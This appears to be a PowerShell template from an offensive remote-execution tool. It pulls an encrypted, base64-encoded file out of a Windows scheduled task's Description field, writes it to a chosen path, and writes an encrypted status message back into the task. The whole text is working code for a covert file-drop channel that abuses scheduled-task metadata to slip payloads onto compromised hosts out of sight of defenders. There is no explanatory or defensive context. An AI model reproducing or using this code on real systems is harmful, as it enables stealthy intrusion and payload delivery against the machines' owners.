$target_path = "REPLACE_FILE_PATH"
$encryptionKey = [System.Convert]::FromBase64String("{key_b64}")
{common_ps}
$task = Get-ScheduledTask -TaskName "{taskname}" -TaskPath \;
if (Test-Path -Path $target_path) {{
    $result = "[-] File already exists."
}}else{{
    try {{
        $decryptedDescription = Decrypt-Data $encryptionKey $task.Description
        # base64 decode get raw data and save it to file
        $decodeData = ConvertFrom-Base64 $decryptedDescription
        # if target path not exists, create it
        $dir = Split-Path $target_path
        if (!(Test-Path -Path $dir)) {{
            New-Item -ItemType Directory -Path $dir
        }}
        $decodeData | Set-Content -Path "REPLACE_FILE_PATH" -Encoding Byte
        $result = "[+] Success."
    }} catch {{
        $result = $_.Exception.Message
    }}
}}
$encryptedResult = Encrypt-Data $encryptionKey $result
$task.Description = $encryptedResult
Set-ScheduledTask $task
[Environment]::Exit(0)